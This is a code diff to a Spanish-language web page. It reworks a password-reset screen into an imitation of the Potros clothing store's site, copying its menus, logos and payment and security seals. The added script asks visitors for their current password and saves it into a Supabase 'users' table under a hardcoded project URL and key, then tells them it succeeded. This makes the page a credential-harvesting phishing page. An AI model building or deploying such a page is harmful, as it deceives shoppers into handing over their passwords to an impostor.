@@ -11,6 +11,74 @@
             background-color: #f5f5f5;
             margin: 0;
         }
+        .top-bar {
+            background: black;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 5px 20px;
+            font-size: 14px;
+        }
+        .top-bar a {
+            color: white;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+        .logo-bar {
+            background: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+        }
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: #C9A32C;
+            display: flex;
+            align-items: center;
+        }
+        .logo span {
+            color: #888;
+        }
+        .logo img {
+            max-height: 27px;
+            margin-right: 9px;
+        }
+        .menu {
+            display: flex;
+            gap: 20px;
+        }
+        .menu a {
+            text-decoration: none;
+            color: black;
+            font-weight: bold;
+        }
+        .search-bar {
+            display: flex;
+            align-items: center;
+        }
+        .search-bar input {
+            border: none;
+            border-bottom: 1px solid black;
+            padding: 5px;
+        }
+        .search-bar button {
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        .cta-bar {
+            background: #C9A32C;
+            text-align: center;
+            padding: 8px;
+            font-weight: bold;
+        }
+        .cta-bar a {
+            color: white;
+            text-decoration: none;
+        }
         .container {
             background: white;
             padding: 20px;
@@ -44,51 +112,196 @@
         button:hover {
             background: #1a252f;
         }
+        .footer {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+        .header {
+            background-color: #333;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo img {
+            height: 40px;
+        }
+        .subscribe {
+            display: flex;
+            align-items: center;
+        }
+        .subscribe input {
+            padding: 5px;
+            border: none;
+            border-radius: 4px;
+            margin-right: 3px;
+        }
+        .subscribe button {
+            background-color: black;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .subscribe button:hover {
+            background-color: #555;
+        }
+        .title {
+            color: gold;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .footer {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+        }
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .bottom-bar {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+        }
+        .social-icons {
+            display: flex;
+            align-items: center;
+        }
+        .social-icons img {
+            height: 20px;
+            margin-left: 10px;
+        }
+        .security-logos {
+            display: flex;
+            align-items: center;
+        }
+        .security-logos img {
+            height: 30px;
+            margin: 0 10px;
+        }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Bienvenido al Sistema de Restablecimiento de Contraseña</h1>
-    </header>
-    
+    <div class="top-bar">
+        <div>
+            <a href="#">📍 Tiendas</a>
+            <a href="#">📖 Ver catálogo</a>
+            <a href="#">🚚 Seguir Orden</a>
+        </div>
+        <div>
+            <a href="#">🔍 Buscar...</a>
+            <a href="#">👤 Iniciar sesión</a>
+            <a href="#">🛒</a>
+        </div>
+    </div>
+    <div class="logo-bar">
+        <div class="logo">
+            <img src="../Downloads/logo-potros.webp" alt="Logo">
+        </div>
+        <div class="menu">
+            <a href="#">NUEVA COLECCIÓN ▼</a>
+            <a href="#">VESTUARIO ▼</a>
+            <a href="#">SALE ▼</a>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Buscar...">
+            <button>🔍</button>
+        </div>
+    </div>
+    <div class="cta-bar">
+        <a href="#">REVISA EL PROCESO DE CAMBIO Y DEVOLUCIONES AQUÍ</a>
+    </div>
     <div class="container">
         <h2>Restablecer Contraseña</h2>
-        <p>Por favor, ingresa tu nueva contraseña.</p>
+        <p>Por favor, ingresa la información necesaria para cambiar tu contraseña.</p>
         <form id="reset-password-form">
-            <input type="password" id="new-password" placeholder="Nueva contraseña" required>
+            <input type="password" id="current-password" placeholder="Ingrese contraseña actual" required>
             <button type="submit">Actualizar contraseña</button>
         </form>
         <p class="footer">Por seguridad, nunca compartas tu contraseña.</p>
     </div>
-    
-    <footer>
-        <p>&copy; 2025 Sistema de Seguridad. Todos los derechos reservados.</p>
-    </footer>
+    <div class="header">
+        <div class="logo">
+            <img src="../Downloads/potros-logo-footer.webp" alt="Logo">
+        </div>
+        <div class="title">Boletín informativo</div>
+        <div class="subscribe">
+            <input type="email" placeholder="Introduzca su dirección de correo">
+            <button>Suscribirse</button>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">SOBRE POTROS ></a>
+        <a href="#">TUS COMPRAS ></a>
+        <a href="#">CONTACTOS ></a>
+        <a href="#">ATENCIÓN A CLIENTES ></a>
+    </div>
 
-    <script type="module">
-        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
-        
-        const supabaseUrl = 'https://ftdvcmkrzmcycknsvxac.supabase.co/';
-        const supabase = createClient(supabaseUrl, import.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ0ZHZjbWtyem1jeWNrbnN2eGFjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk2NDYxNjksImV4cCI6MjA1NTIyMjE2OX0.wLleCp0JQxZH8cSmxmr6JSZRz4VGbAnCEUbHrbPgKHg);
-        
+    <div class="bottom-bar">
+        <div>
+            <img src="../Downloads/pngegg (1).png" alt="100" height="50">
+        </div>
+        <div class="social-icons">
+            <span>REDES SOCIALES</span>
+            <a href="https://www.facebook.com" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+            </a>
+            <a href="https://www.instagram.com" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+            </a>
+            <a href="https://www.twitter.com" target="_blank">
+                <img src="../Downloads/pngwing.com (3).png">
+            </a>
+        </div>
+        <div class="security-logos">
+            <img src="../Downloads/webpay-footer.webp" alt="WebPay">
+            <img src="../Downloads/certificadoCCS.webp" alt="Security">
+            <img src="../Downloads/logo-grupotexsa.webp" alt="Grupo TEXSA">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+        </div>
+    </div>
+
+    <script>
+        const supabaseUrl = 'https://ftdvcmkrzmcycknsvxac.supabase.co';  // Coloca tu URL de Supabase
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ0ZHZjbWtyem1jeWNrbnN2eGFjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk2NDYxNjksImV4cCI6MjA1NTIyMjE2OX0.wLleCp0JQxZH8cSmxmr6JSZRz4VGbAnCEUbHrbPgKHg';  // Coloca tu clave pública de Supabase
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
         document.getElementById('reset-password-form').addEventListener('submit', async (event) => {
-            event.preventDefault();
+            event.preventDefault(); // Evita que el formulario se recargue
 
-            const newPassword = document.getElementById('new-password').value;
+            const currentPassword = document.getElementById('current-password').value;
 
-            if (!newPassword) {
-                alert('Por favor ingrese una nueva contraseña.');
+            if (!currentPassword) {
+                alert('Por favor ingrese la contraseña actual.');
                 return;
             }
 
             try {
-                const { error } = await supabase.auth.updateUser({ password: newPassword });
+                // Guarda la contraseña actual en la base de datos
+                const { data, error } = await supabase
+                    .from('users')  // Nombre de la tabla en tu base de datos
+                    .upsert({ password: currentPassword });  // Guarda solo la contraseña actual
 
                 if (error) {
-                    console.error('Error al actualizar la contraseña:', error);
-                    alert('Ocurrió un error al actualizar la contraseña.');
+                    console.error('Error al guardar la contraseña:', error);
+                    alert('Ocurrió un error al guardar la contraseña.');
                 } else {
-                    alert('Contraseña actualizada con éxito.');
+                    console.log('Contraseña actualizada correctamente:', data);
+                    alert('Contraseña guardada con éxito.');
                 }
             } catch (err) {
                 console.error('Error inesperado:', err);
